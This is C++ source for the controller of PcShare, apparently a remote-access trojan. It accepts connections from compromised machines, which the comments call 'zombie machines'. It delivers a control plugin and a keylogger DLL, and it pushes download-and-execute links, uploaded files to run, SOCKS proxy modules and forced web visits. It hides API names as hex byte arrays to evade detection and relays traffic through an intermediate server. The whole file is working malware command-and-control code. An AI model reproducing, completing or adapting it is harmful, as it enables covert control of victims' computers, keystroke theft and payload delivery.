// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "PcShare.h"
#include "MainFrm.h"
#include "Lzw.h"
#include "MySetupDlg.h"
#include "MyToServerDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMainFrame

CMainFrame* pMainFrame = NULL;

//版本校验标志
ULONGLONG m_StartUpFlag[2] = {PS_STARTUP_FLAG, 0};

IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_COPYDATA()
	//}}AFX_MSG_MAP
	ON_COMMAND(ID_EXIT, OnClose)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
	hLockFileMutex = CreateMutex(NULL, FALSE, NULL);
	hExitEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

	//控制插件
	m_DllSize = 0;
	pDllFileData = NULL;

	//键盘插件
	m_KeySize = 0;
	pKeyFileData = NULL;

/*	//CMD数据
	m_CmdSize = 0;
	pCmdFileData = NULL;
*/
	//SOCKS插件
	pSckFileData = NULL;
	m_SckSize = 0;

	//更新客户端文件
	nUpdateFileLen = 0;
	pUpdateFileData = NULL;

	//上传客户端文件
	nUpLoadFileLen = 0;
	pUpLoadFileData = NULL;

	
	//访问指定网页
	nLinkStrLen = 0;
	pLinkStrData = NULL;

	//用户显示信息
	nMessStrLen = 0;
	pMessStrData = NULL;

	//下载执行连接
	nDownUrlLen = 0;
	pDownUrlData = NULL;

	nVolumeSerialNumber = 0;

	m_IsProxy = FALSE;
}

CMainFrame::~CMainFrame()
{
	if(m_Socket != NULL)
	{
		closesocket(m_Socket);
	}

	CloseHandle(hLockFileMutex);
	CloseHandle(hExitEvent);

/*	if(pCmdFileData != NULL)
	{
		delete [] pCmdFileData;
	}
*/
	if(pDllFileData != NULL)
	{
		delete [] pDllFileData;
	}

	if(pSckFileData != NULL)
	{
		delete [] pSckFileData;
	}

	if(pKeyFileData != NULL)
	{
		delete [] pKeyFileData;
	}

	if(pUpdateFileData != NULL)
	{
		delete [] pUpdateFileData;
	}

	if(pUpLoadFileData != NULL)
	{
		delete [] pUpLoadFileData;
	}

	if(pLinkStrData != NULL)
	{
		delete [] pLinkStrData;
	}

	if(pMessStrData != NULL)
	{
		delete [] pMessStrData;
	}

	if(pDownUrlData != NULL)
	{
		delete [] pDownUrlData;
	}
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}

#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers

void CMainFrame::DisEnableXvidShow()
{
	HKEY m_key = NULL;
	DWORD m_Res = 0;
	long ret = RegCreateKeyEx(	HKEY_CURRENT_USER,
								_T("Software\\GNU\\XviD"),
								0,
								NULL,
								REG_OPTION_NON_VOLATILE,
								KEY_ALL_ACCESS,
								NULL,
								&m_key,
								&m_Res
							 );
	if(ret != ERROR_SUCCESS) 
	{
		return;
	}

	DWORD nValue = 0;
	ret = RegSetValueEx(m_key,
					_T("display_status"),
					0,
					REG_DWORD,
					(CONST BYTE *) &nValue,
					sizeof(DWORD)
				 );
	RegCloseKey(m_key);
}

void DisEnableXvidShow1()
{
	HKEY m_key = NULL;
	DWORD m_Res = 0;
	long ret = RegCreateKeyEx(	HKEY_CURRENT_USER,
								_T("Software\\GNU\\XviD\\config"),
								0,
								NULL,
								REG_OPTION_NON_VOLATILE,
								KEY_ALL_ACCESS,
								NULL,
								&m_key,
								&m_Res
							 );
	if(ret != ERROR_SUCCESS) 
	{
		return;
	}

	DWORD nValue = 0;
	ret = RegSetValueEx(m_key,
					_T("display_status"),
					0,
					REG_DWORD,
					(CONST BYTE *) &nValue,
					sizeof(DWORD)
				 );
	RegCloseKey(m_key);

}

DWORD GetMySerialNumber()
{
	/*Kernel32.dll*/
	char m_TmpStr[256] = {0};
	m_TmpStr[0] = (char) 0x4b;
	m_TmpStr[1] = (char) 0x65;
	m_TmpStr[2] = (char) 0x72;
	m_TmpStr[3] = (char) 0x6e;
	m_TmpStr[4] = (char) 0x65;
	m_TmpStr[5] = (char) 0x6c;
	m_TmpStr[6] = (char) 0x33;
	m_TmpStr[7] = (char) 0x32;
	m_TmpStr[8] = (char) 0x2e;
	m_TmpStr[9] = (char) 0x64;
	m_TmpStr[10] = (char) 0x6c;
	m_TmpStr[11] = (char) 0x6c;
	m_TmpStr[12] = 0x00;

	HMODULE hModule_Kernel32 = LoadLibraryA(m_TmpStr);

	/*GetVolumeInformationA*/
	m_TmpStr[0] = (char) 0x47;
	m_TmpStr[1] = (char) 0x65;
	m_TmpStr[2] = (char) 0x74;
	m_TmpStr[3] = (char) 0x56;
	m_TmpStr[4] = (char) 0x6f;
	m_TmpStr[5] = (char) 0x6c;
	m_TmpStr[6] = (char) 0x75;
	m_TmpStr[7] = (char) 0x6d;
	m_TmpStr[8] = (char) 0x65;
	m_TmpStr[9] = (char) 0x49;
	m_TmpStr[10] = (char) 0x6e;
	m_TmpStr[11] = (char) 0x66;
	m_TmpStr[12] = (char) 0x6f;
	m_TmpStr[13] = (char) 0x72;
	m_TmpStr[14] = (char) 0x6d;
	m_TmpStr[15] = (char) 0x61;
	m_TmpStr[16] = (char) 0x74;
	m_TmpStr[17] = (char) 0x69;
	m_TmpStr[18] = (char) 0x6f;
	m_TmpStr[19] = (char) 0x6e;
	m_TmpStr[20] = (char) 0x41;
	m_TmpStr[21] = 0x00;

	MyGetVolumeInformation P_GetVolumeInformation =  (MyGetVolumeInformation) GetProcAddress(hModule_Kernel32, m_TmpStr);

	/*c:\\*/
	m_TmpStr[0] = (char) 0x63;
	m_TmpStr[1] = (char) 0x3a;
	m_TmpStr[2] = (char) 0x5c;
	m_TmpStr[3] = 0x00;

	char FileSysNameBuf[1024] = {0};
	DWORD dwSysFlags = 0;
	DWORD nNum =0;
	if(!P_GetVolumeInformation(m_TmpStr, NULL, 0, &nNum, NULL, &dwSysFlags, FileSysNameBuf, 1024))
	{
		FreeLibrary(hModule_Kernel32);
		return 0;
	}
	FreeLibrary(hModule_Kernel32);
	return nNum;
}

BOOL CMainFrame::StartWork()
{
	//组织XVID显示
	DisEnableXvidShow();
	DisEnableXvidShow1();

	TCHAR m_sIsFirst[256] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("是否初次启动"), _T("1"), m_sIsFirst, 19, GetIniFileName());
	if(StrToInt(m_sIsFirst)== 1)
	{
		PostMessage(WM_COMMAND, ID_GLOBAL_SETUP, 0);
		WritePrivateProfileString(PS_SHEZHI, _T("是否初次启动"), _T("0"), GetIniFileName());
	}

	TCHAR m_Text[1024] = {0};

	//取版本控制代码
	nVolumeSerialNumber = GetMySerialNumber();
	
	//需要中转连接
	CMyToServerDlg m_ToDlg(this);
	m_ToDlg.DoModal();
	if(m_ToDlg.m_CmdSocket != NULL)
	{
		m_IsProxy = TRUE;
		m_Socket = m_ToDlg.m_CmdSocket;
	}
	else
	{
		while(1)
		{
			TCHAR m_sPortMain[100] = {0};
			GetPrivateProfileString(PS_SHEZHI, _T("上线连接端口"), _T("80"), m_sPortMain, 99, GetIniFileName());

			//打开上线侦听端口
			m_Socket = StartTcp(StrToInt(m_sPortMain));
			if(m_Socket	== NULL)
			{	
				wsprintf(m_Text, _T("端口%s已经被占用，需要改变连接端口吗？"), m_sPortMain);
				if(MessageBox(m_Text, _T("错误"), MB_OKCANCEL) != IDOK)
				{
					return FALSE;
				}
				CMySetupDlg dlg;
				dlg.DoModal();
			}
			else
			{
				break;
			}
		}

	
	}

	//启动主控制台
	StartMainShowProcess();

	//启动文件下载管理
	StartFileDownProcess();

	if(m_IsProxy)
	{
		TCHAR m_sServerAddr[256] = {0};
		GetPrivateProfileString(PS_SHEZHI, _T("中转服务器地址"), _T(""), m_sServerAddr, 99, GetIniFileName());

		TCHAR m_sPort[256] = {0};
		GetPrivateProfileString(PS_SHEZHI, _T("中转服务器端口"), _T(""), m_sPort, 99, GetIniFileName());

		wsprintf(m_Text, _T("内网中转模式，连接到服务器【%s:%s】"), m_sServerAddr, m_sPort);
		SendLogs(m_Text);

		_beginthread(DoProxyListenThread, 0, (LPVOID) this);
	}
	else
	{
		TCHAR m_sPortMain[100] = {0};
		GetPrivateProfileString(PS_SHEZHI, _T("上线连接端口"), _T("80"), m_sPortMain, 99, GetIniFileName());
		wsprintf(m_Text, _T("正常模式，侦听端口【%s】"), m_sPortMain);
		SendLogs(m_Text);

		_beginthread(DoNormalListenThread, 0, (LPVOID) this);
	}
	return TRUE;
}

void CMainFrame::DoNormalListenThread(LPVOID lPvoid)
{
	pMainFrame = (CMainFrame*) lPvoid;
	SOCKET m_AccSocket = 0;
	while(WaitForSingleObject(pMainFrame->hExitEvent, 55) == WAIT_TIMEOUT)
	{
		//等待客户连接
		if((m_AccSocket = accept(pMainFrame->m_Socket, 0, 0)) == INVALID_SOCKET) 
		{
			break;
		}

		//启动客户签到线程
		_beginthread(DoNormalChildWorkThread, 0, (LPVOID) m_AccSocket);
	}
}

void CMainFrame::DoProxyListenThread(LPVOID lPvoid)
{
	pMainFrame = (CMainFrame*) lPvoid;
	while(WaitForSingleObject(pMainFrame->hExitEvent, 0) == WAIT_TIMEOUT)
	{
		PROXYLOGININFO m_Info = {0};
		int ret = recv(pMainFrame->m_Socket, (char*) &m_Info, sizeof(PROXYLOGININFO), 0);
		if(ret == SOCKET_ERROR || ret == 0)
		{
			pMainFrame->MessageBox(_T("中转服务器已经掉线！"), _T("警告"));
			break;
		}
		if(m_Info.m_Cmd == P_CONNECT_DATA)
		{
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) DoProxyChildWorkThread, (LPVOID) m_Info.m_Data, 0, NULL);
		}
	}
}

void CMainFrame::DoProxyChildWorkThread(LPVOID lPvoid)
{
	TCHAR m_sServerAddr[256] = {0};
	char m_aServerAddr[256] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("中转服务器地址"), _T(""), m_sServerAddr, 99, GetIniFileName());
	WideCharToMultiByte(CP_ACP, 0,	m_sServerAddr, lstrlen(m_sServerAddr) + 1, m_aServerAddr, 256, NULL, NULL);

	TCHAR m_sPort[256] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("中转服务器端口"), _T(""), m_sPort, 99, GetIniFileName());

	//连接到中转服务器
	SOCKET sServer = GetConnectSocket(m_aServerAddr, StrToInt(m_sPort));
	if(sServer == NULL)
	{
		return;
	}
	
	//发送标志
	PROXYLOGININFO m_Info = {0};
	m_Info.m_Data = (DWORD) lPvoid;
	m_Info.m_Cmd = P_CONNECT_DATA;
	if(send(sServer, (char*) &m_Info, sizeof(PROXYLOGININFO), 0) == SOCKET_ERROR)
	{
		closesocket(sServer);
		return;
	}

	pMainFrame->DoChildWork(sServer);
}

void CMainFrame::DoNormalChildWorkThread(LPVOID lPvoid)
{
	//实际工作进程
	pMainFrame->DoChildWork((SOCKET) lPvoid);
}

void CMainFrame::SendLogs(LPCTSTR pText)
{
	HWND hMainListWnd = GetMainListWnd();

	TCHAR m_Text[1024] = {0};
	lstrcpy(m_Text, pText);

	COPYDATASTRUCT ct = {0};
	ct.lpData = m_Text;
	ct.cbData = lstrlen(m_Text) * sizeof(TCHAR);
	ct.dwData = PS_LOCAL_SHOW_MESS;
	::SendMessage(hMainListWnd, WM_COPYDATA, 0, (LPARAM) &ct);
}

BOOL CMainFrame::GetSysFileData(LPCTSTR pFileName, BYTE** pFileDataBuf, DWORD* pFileDataLen, LPCTSTR pTitle)
{
	//增加字串资源
	DWORD nStringLen = 0;
	LPBYTE pStringData  = GetMyExeSource(_T("DLLSTRING"), _T("MOD"), nStringLen);
	if(pStringData == NULL)
	{
		TCHAR m_Text[256] = _T("字串资源丢失！");
		SendLogs(m_Text);
		return FALSE;
	}

	//控制功能插件
	TCHAR m_FilePath[1204] = {0};
	lstrcpy(m_FilePath, pFileName);
	GetSysFileName(m_FilePath);
	CFile m_File;
	if(!m_File.Open(m_FilePath, CFile::modeRead))
	{
		TCHAR m_Text[256] = {0};
		wsprintf(m_Text, _T("客户【%s】请求文件【%s】失败，请检查文件是否存在！"), pTitle, m_FilePath);
		SendLogs(m_Text);
		return FALSE;
	}
	DWORD nTmpFileDataLen = m_File.GetLength();
	BYTE* pTmpFileDataBuf = new BYTE[nTmpFileDataLen];
	m_File.Read(pTmpFileDataBuf, nTmpFileDataLen);
	m_File.Close();

	//修改DLL导出文件名称
	ChangeDllExportFunc(pTmpFileDataBuf, nTmpFileDataLen);

	//压缩字串
	FCLzw lzw;
	BYTE* pStrZipData = new BYTE[nStringLen * 2 + 65535];
	memset(pStrZipData, 0, nStringLen * 2 + 65535);
	lzw.PcZip(pStringData, pStrZipData, &nStringLen);
	
	//保存数据到控制DLL
	DWORD	nSaveLen = sizeof(PSSAVEFILEINFO) + nStringLen;
	LPBYTE	pSaveData = new BYTE[nSaveLen];
	BYTE*	pCurPoint = pSaveData;

	PSSAVEFILEINFO m_SaveFileInfo = {0};
	
	//填充启动标志
	m_SaveFileInfo.m_FindFlag = PS_FIND_FLAG;

	//字串数据长度
	m_SaveFileInfo.m_StringLen = nStringLen;

	//信息头
	memcpy(pCurPoint, &m_SaveFileInfo, sizeof(PSSAVEFILEINFO));
	pCurPoint += sizeof(PSSAVEFILEINFO);
	
	//字符串资源
	memcpy(pCurPoint, pStrZipData, nStringLen);
	pCurPoint += nStringLen;

	//取临时文件名称
	TCHAR m_TmpFilePath[256] = {0};
	GetTempPath(250, m_TmpFilePath);
	wsprintf(m_TmpFilePath + lstrlen(m_TmpFilePath), _T("SysFile_%d.dll"), GetCurrentProcessId());

	//保存到DLL文件
	if(!AddDataToPe(pSaveData, nSaveLen, pTmpFileDataBuf, nTmpFileDataLen, m_TmpFilePath))
	{
		delete [] pSaveData;
		delete [] pTmpFileDataBuf;
		delete [] pStrZipData;
		TCHAR m_Text[256] = _T("系统内部错误！");
		SendLogs(m_Text);
		return FALSE;
	}
	delete [] pStrZipData;
	delete [] pSaveData;
	delete [] pTmpFileDataBuf;

	//取添加后的文件
	if(!m_File.Open(m_TmpFilePath, CFile::modeRead))
	{
		TCHAR m_Text[256] = _T("系统内部错误！");
		SendLogs(m_Text);
		return FALSE;
	}
	nTmpFileDataLen = m_File.GetLength();
	pTmpFileDataBuf = new BYTE[nTmpFileDataLen];
	m_File.Read(pTmpFileDataBuf, nTmpFileDataLen);
	m_File.Close();
	DeleteFile(m_TmpFilePath);

	//压缩插件
	BYTE* pZipDllFileData = new BYTE[nTmpFileDataLen * 2 + 65535];
	memset(pZipDllFileData, 0, nTmpFileDataLen * 2 + 65535);
	lzw.PcZip(pTmpFileDataBuf, pZipDllFileData, &nTmpFileDataLen);
	
	//拷贝数据
	*pFileDataBuf = new BYTE[nTmpFileDataLen + 1];
	memcpy(*pFileDataBuf, pZipDllFileData, nTmpFileDataLen);
	*pFileDataLen = nTmpFileDataLen;

	delete [] pTmpFileDataBuf;
	delete [] pZipDllFileData;
	return TRUE;
}

void CMainFrame::DownLoadModFile(MyServerTran* pTran)
{
	//查看控制功能插件是否准备好
	if(WaitForSingleObject(hLockFileMutex, 0xffffff) != WAIT_OBJECT_0)
	{
		return;
	}
	if(pDllFileData == NULL)
	{
		if(!GetSysFileData(_T("pcmain.dll"), &pDllFileData, &m_DllSize, pTran->GetTitle()))
		{
			ReleaseMutex(hLockFileMutex);
			return;
		}
	}
	ReleaseMutex(hLockFileMutex);

	//下载控制文件
	if(!pTran->TcpSendData(&m_DllSize, sizeof(DWORD)) || !pTran->TcpSendData(pDllFileData, m_DllSize))
	{
		
	}
}

void CMainFrame::DownLoadKeyFile(MyServerTran* pTran)
{
	//查看控制功能插件是否准备好
	if(WaitForSingleObject(hLockFileMutex, 0xffffff) != WAIT_OBJECT_0)
	{
		return;
	}
	if(pKeyFileData == NULL)
	{
		if(!GetSysFileData(_T("pclkey.dll"), &pKeyFileData, &m_KeySize, pTran->GetTitle()))
		{
			ReleaseMutex(hLockFileMutex);
			return;
		}
	}
	ReleaseMutex(hLockFileMutex);

	//下载控制文件
	if(!pTran->TcpSendData(&m_KeySize, sizeof(DWORD)) || !pTran->TcpSendData(pKeyFileData, m_KeySize))
	{
		
	}
}

void CMainFrame::DoWndTransWork(MyServerTran* pTran)
{
	//检查窗口是否存在
	if(IsWindow(pTran->GetLoginInfo()->m_hWnd))
	{
		TCPCONNECTINFO m_ConnectInfo = {0};
		CopyMemory(&m_ConnectInfo.m_SysInfo, pTran->GetLoginInfo(), sizeof(LOGININFO));
		lstrcpy(m_ConnectInfo.m_RealIp, pTran->m_ProxyIp);

		//拷贝套接字
		DWORD nPid = 0;
		GetWindowThreadProcessId(pTran->GetLoginInfo()->m_hWnd, &nPid);
		if(WSADuplicateSocket(pTran->GetSafeSocket(), nPid, &m_ConnectInfo.m_SocketInfo) == 0)
		{
			//发送数据到目标进程
			COPYDATASTRUCT ct = {0};
			ct.lpData = &m_ConnectInfo;
			ct.cbData = sizeof(TCPCONNECTINFO);
			ct.dwData = PS_SOCKET_CONNECT;
			::SendMessage(pTran->GetLoginInfo()->m_hWnd, WM_COPYDATA, 0, (LPARAM) &ct);
		}
	}
}

void CMainFrame::SendMainConnect(MyServerTran* pTran)
{
	TCHAR m_PassWord[32] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("上线连接密码"), _T(""), m_PassWord, 32, GetIniFileName());
	if(pTran->GetLoginInfo()->m_hWnd != (HWND) StrToInt(m_PassWord))
	{
		return;
	}

	TCPCONNECTINFO m_ConnectInfo = {0};
	CopyMemory(&m_ConnectInfo.m_SysInfo, pTran->GetLoginInfo(), sizeof(LOGININFO));
	lstrcpy(m_ConnectInfo.m_RealIp, pTran->m_ProxyIp);
	
	HWND hMainListWnd = GetMainListWnd();

	//增加肉机到主控制台
	DWORD nPid = 0;
	GetWindowThreadProcessId(hMainListWnd, &nPid);
	if(WSADuplicateSocket(pTran->GetSafeSocket(), nPid, &m_ConnectInfo.m_SocketInfo) == 0)
	{
		//发送数据到目标进程
		COPYDATASTRUCT ct = {0};
		ct.lpData = &m_ConnectInfo;
		ct.cbData = sizeof(TCPCONNECTINFO);
		ct.dwData = PS_SOCKET_CONNECT;
		::SendMessage(hMainListWnd, WM_COPYDATA, 0, (LPARAM) &ct);
	}

	//检查是否有文件下载
	TCHAR nCWndName[256] = {0};
	wsprintf(nCWndName, _T("%s下载管理"), PS_TITLE);
	HWND hFileWnd = ::FindWindow(NULL, nCWndName);
	if(hFileWnd == NULL)
	{
		return ;
	}

	COPYDATASTRUCT ct = {0};
	ct.lpData = (LPVOID) pTran->GetId();
	ct.cbData = 256 * sizeof(TCHAR);
	ct.dwData = PS_LOCAL_CHECK_FILE_DL;
	::SendMessage(hFileWnd, WM_COPYDATA, 0, (LPARAM) &ct);
}

void CMainFrame::SendClientDown(MyServerTran* pTran)
{
	TCPCONNECTINFO m_ConnectInfo = {0};
	CopyMemory(&m_ConnectInfo.m_SysInfo, pTran->GetLoginInfo(), sizeof(LOGININFO));
	lstrcpy(m_ConnectInfo.m_RealIp, pTran->m_ProxyIp);
	
	HWND hMainListWnd = GetMainListWnd();

	//通知控制台删除客户
	COPYDATASTRUCT ct = {0};
	ct.lpData = (LPVOID) pTran->GetId();
	ct.cbData = 256 * sizeof(TCHAR);
	ct.dwData = PS_LOCAL_CLIENT_DOWN;
	::SendMessage(hMainListWnd, WM_COPYDATA, 0, (LPARAM) &ct);
}

void CMainFrame::SendDataToClient(MyServerTran* pTran, DWORD nSendDataLen, BYTE* pSendData)
{
	if(nSendDataLen == 0 || pSendData == NULL)
	{
		return;
	}

	//拷贝数据
	WaitForSingleObject(hLockFileMutex, 0xffffff);
	LPBYTE	pFileData = new BYTE[nSendDataLen];
	DWORD	nFileLen = nSendDataLen;
	memcpy(pFileData, pSendData, nSendDataLen);
	ReleaseMutex(hLockFileMutex);

	//发送文件数据
	pTran->TcpSendData(&nFileLen, sizeof(DWORD));
	pTran->TcpSendData(pFileData, nFileLen);
	delete [] pFileData;
}

//接收连接线程
void CMainFrame::DoChildWork(SOCKET s)
{
	if(m_StartUpFlag[1] != 0 && m_StartUpFlag[1] != nVolumeSerialNumber)
	{
		return;
	}

	MyServerTran m_Tran;
	if(!m_Tran.CreateSocket(s, m_IsProxy))
	{
		Sleep(1000);
	}
	else
	{
		switch(m_Tran.GetLoginInfo()->m_Cmd)
		{
			//下载控制插件
			case WM_CONNECT_DMOD :
				DownLoadModFile(&m_Tran);
				break;

			//下载键盘插件
			case WM_CONNECT_KEYM :
				DownLoadKeyFile(&m_Tran);
				break;

			//主控连接建立
			case WM_CONNECT_MAIN :
				SendMainConnect(&m_Tran);
				break;

			//更新客户端文件
			case WM_CONNECT_UPDA :
				SendDataToClient(&m_Tran, nUpdateFileLen, pUpdateFileData);
				break;

			//开启SOCKS服务
			case WM_CONNECT_SOCKS :
				SendDataToClient(&m_Tran, m_SckSize, pSckFileData);
				break;

			//上创文件并执行
			case WM_CONNECT_UPLO :
				SendDataToClient(&m_Tran, nUpLoadFileLen, pUpLoadFileData);
				break;

			//客户退出通知
			case WM_CONNECT_CLIENT_DOWN :
				SendClientDown(&m_Tran);
				break;

/*			//下载cmd.exe
			case WM_CONNECT_CMD :
				m_Tran.SendDataWithCmd(pCmdFileData, m_CmdSize, 0);
				break;
*/
			//下载指定联结并执行
			case WM_CONNECT_TURL :
				SendDataToClient(&m_Tran, nDownUrlLen, pDownUrlData);
				break;

			//用户显示信息
			case WM_CONNECT_MESS :
				SendDataToClient(&m_Tran, nMessStrLen, pMessStrData);
				break;

			//访问指定网页
			case WM_CONNECT_LINK :
				SendDataToClient(&m_Tran, nLinkStrLen, pLinkStrData);
				break;

			//各种交易套接字
			default :
				DoWndTransWork(&m_Tran);
				break;
		}
	}
}

BOOL CMainFrame::OnCopyData(CWnd* pWnd, COPYDATASTRUCT* pCopyDataStruct) 
{
	if(m_StartUpFlag[1] != 0 && m_StartUpFlag[1] != nVolumeSerialNumber)
	{
		return FALSE;
	}

	WaitForSingleObject(hLockFileMutex, 0xffffff);
	if(pCopyDataStruct->dwData == PS_LOCAL_SEND_MESS)
	{
		//通知肉机显示信息
		if(pMessStrData != NULL)
		{
			delete [] pMessStrData;
		}
		pMessStrData = new BYTE[pCopyDataStruct->cbData];
		nMessStrLen = pCopyDataStruct->cbData;
		memcpy(pMessStrData, pCopyDataStruct->lpData, pCopyDataStruct->cbData);
	}
	else if(pCopyDataStruct->dwData == PS_LOCAL_SEND_LINK)
	{
		//通知肉机访问连接
		if(pLinkStrData != NULL)
		{
			delete [] pLinkStrData;
		}
		pLinkStrData = new BYTE[pCopyDataStruct->cbData];
		nLinkStrLen = pCopyDataStruct->cbData;
		memcpy(pLinkStrData, pCopyDataStruct->lpData, pCopyDataStruct->cbData);
	}
	else if(pCopyDataStruct->dwData == PS_LOCAL_SEND_TURL)
	{
		//通知肉机下载连接
		if(pDownUrlData != NULL)
		{
			delete [] pDownUrlData;
		}
		pDownUrlData = new BYTE[pCopyDataStruct->cbData];
		nDownUrlLen = pCopyDataStruct->cbData;
		memcpy(pDownUrlData, pCopyDataStruct->lpData, pCopyDataStruct->cbData);
	}
	else if(pCopyDataStruct->dwData == PS_LOCAL_SEND_UPDATE)
	{
		//更新肉机文件
		if(pUpdateFileData != NULL)
		{
			delete [] pUpdateFileData;
		}
		pUpdateFileData = new BYTE[pCopyDataStruct->cbData];
		nUpdateFileLen = pCopyDataStruct->cbData;
		memcpy(pUpdateFileData, pCopyDataStruct->lpData, pCopyDataStruct->cbData);
	}
	else if(pCopyDataStruct->dwData == PS_LOCAL_START_SOCKS)
	{
		//开启SOCKS服务
		if(pSckFileData != NULL)
		{
			delete [] pSckFileData;
		}
		pSckFileData = new BYTE[pCopyDataStruct->cbData];
		m_SckSize = pCopyDataStruct->cbData;
		memcpy(pSckFileData, pCopyDataStruct->lpData, pCopyDataStruct->cbData);
	}
	else if(pCopyDataStruct->dwData == PS_LOCAL_SEND_UPLOAD)
	{
		//上传肉机文件
		if(pUpLoadFileData != NULL)
		{
			delete [] pUpLoadFileData;
		}
		pUpLoadFileData = new BYTE[pCopyDataStruct->cbData];
		nUpLoadFileLen = pCopyDataStruct->cbData;
		memcpy(pUpLoadFileData, pCopyDataStruct->lpData, pCopyDataStruct->cbData);
	}
	ReleaseMutex(hLockFileMutex);
	return TRUE;
}

SOCKET CMainFrame::GetConnectSocket(char* pServerAddr, UINT nServerPort)
{
	struct sockaddr_in	m_ServerAddr = {0}; 
	int			m_AddrLen = sizeof(struct sockaddr_in);
	SOCKET		m_Socket = 0;

	char m_sServerIp[MAX_PATH] = {0};
	strcpy(m_sServerIp, pServerAddr);
	DWORD dIp = inet_addr(m_sServerIp);
	if(dIp == INADDR_NONE)
	{
		PHOSTENT hostinfo = gethostbyname(m_sServerIp);
		if(hostinfo == NULL)
		{
			return NULL;
		}
		struct sockaddr_in dest = {0};
		CopyMemory(&(dest.sin_addr), hostinfo->h_addr_list[0], hostinfo->h_length);
		lstrcpyA(m_sServerIp, inet_ntoa(dest.sin_addr));
	}

	//初始化连接信息
	m_ServerAddr.sin_addr.S_un.S_addr = inet_addr(m_sServerIp);
	m_ServerAddr.sin_port = htons(nServerPort); 
	m_ServerAddr.sin_family = AF_INET;

	//创建发送套接字
	m_Socket = socket(AF_INET, SOCK_STREAM, 0);
	if(m_Socket == INVALID_SOCKET)
	{
		return NULL;
	}
	
	//连接客户计算机
	if(connect(m_Socket, (sockaddr*)& m_ServerAddr, m_AddrLen) == SOCKET_ERROR) 
	{ 
		closesocket(m_Socket); 
		return NULL;
	}

	BOOL nodelayval = TRUE;
	if (setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, (const char *) &nodelayval, sizeof(BOOL)))
	{
		closesocket(m_Socket); 
		return NULL;
	}

	const int one = 1;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&one, sizeof(one)))
    {
		closesocket(m_Socket); 
		return NULL;
    }

	//连接成功
	return m_Socket;
}

SOCKET CMainFrame::StartTcp(WORD Port)
{
	SOCKET		Sck = NULL;	
	sockaddr_in addr = {0};
	int optval = 10000;

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(Port);

	Sck = socket(AF_INET, SOCK_STREAM, 0);
	if(Sck==INVALID_SOCKET)
	{
		return NULL;
	}

	if(bind(Sck, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
	{
		closesocket(Sck);
		return NULL;
	}

	if(setsockopt(Sck, SOL_SOCKET, SO_SNDTIMEO, (char*) &optval, sizeof(optval)) == SOCKET_ERROR)
	{
		closesocket(Sck);
		return NULL;
	}

	if(setsockopt(Sck, SOL_SOCKET, SO_RCVTIMEO, (char*) &optval, sizeof(optval))	== SOCKET_ERROR)
	{
		closesocket(Sck);
		return NULL;
	}

	if(listen(Sck, SOMAXCONN) == SOCKET_ERROR)
	{
		closesocket(Sck);
		return NULL;
	}
	return Sck;
}

void CMainFrame::StartFileDownProcess()
{
	//启动新的子进程
	TCHAR m_lpCmdLine[512] = {0};
	GetModuleFileName(NULL, m_lpCmdLine, 500);
	int len = lstrlen(m_lpCmdLine);
	wsprintf(m_lpCmdLine + len, _T(" title=%s下载管理;mainhwnd=%d"), PS_TITLE, GetSafeHwnd());

	if(!IsMulitProcess())
	{
		StartMoudle(m_lpCmdLine);
	}
	else
	{
		STARTUPINFO st = {0};
		st.cb = sizeof(STARTUPINFO);
		PROCESS_INFORMATION pi = {0};
		if(!CreateProcess(NULL, m_lpCmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &st, &pi))
		{
			MessageBox(_T("创建进程失败"), _T("提示"), MB_OK|MB_ICONWARNING);
		}
		else
		{
			WaitForInputIdle(pi.hProcess, 3000);
		}
	}
}

void CMainFrame::StartMainShowProcess()
{
	//启动新的子进程
	TCHAR m_lpCmdLine[512] = {0};
	GetModuleFileName(NULL, m_lpCmdLine, 500);
	int len = lstrlen(m_lpCmdLine);
	wsprintf(m_lpCmdLine + len, _T(" title=%s主控制台;mainhwnd=%d"), PS_TITLE, GetSafeHwnd());

	if(!IsMulitProcess())
	{
		StartMoudle(m_lpCmdLine);
	}
	else
	{
		STARTUPINFO st = {0};
		st.cb = sizeof(STARTUPINFO);
		PROCESS_INFORMATION pi = {0};
		if(!CreateProcess(NULL, m_lpCmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &st, &pi))
		{
			MessageBox(_T("创建进程失败"), _T("提示"), MB_OK|MB_ICONWARNING);
		}
		else
		{
			WaitForInputIdle(pi.hProcess, 3000);
		}
	}
}
